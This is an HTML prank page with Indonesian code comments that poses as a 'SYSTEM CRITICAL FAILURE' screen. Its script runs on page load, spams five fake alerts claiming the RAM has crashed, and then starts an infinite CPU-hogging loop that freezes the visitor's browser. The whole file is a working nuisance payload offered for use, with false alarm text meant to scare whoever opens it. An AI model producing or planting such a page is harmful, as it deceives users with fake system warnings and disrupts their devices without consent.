<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>❌ SYSTEM CRITICAL FAILURE</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: monospace;
      text-align: center;
      padding-top: 100px;
    }

    h1 {
      font-size: 42px;
      animation: shake 0.1s infinite;
    }

    @keyframes shake {
      0% { transform: translate(2px, 1px); }
      25% { transform: translate(-2px, -1px); }
      50% { transform: translate(2px, -2px); }
      75% { transform: translate(-2px, 2px); }
      100% { transform: translate(0, 0); }
    }
  </style>
</head>
<body>
  <h1>❌ SYSTEM CRITICAL FAILURE</h1>
  <p>Memory overload. Attempting emergency shutdown...</p>

  <script>
    // Alert spam sebelum lag
    let count = 0;
    function warnLoop() {
      alert("❗ Sistem crash! RAM overload!");
      count++;
      if (count < 5) setTimeout(warnLoop, 300);
      else triggerLag();
    }

    // Freeze / CPU 100%
    function triggerLag() {
      // INFINITE CPU HOG LOOP
      while (true) {
        // Kalkulasi random berat (bikin lag parah)
        Math.sqrt(Math.random() * Date.now()) * Math.random();
      }
    }

    // Mulai setelah load
    window.onload = () => {
      setTimeout(warnLoop, 500);
    };
  </script>
</body>
</html>
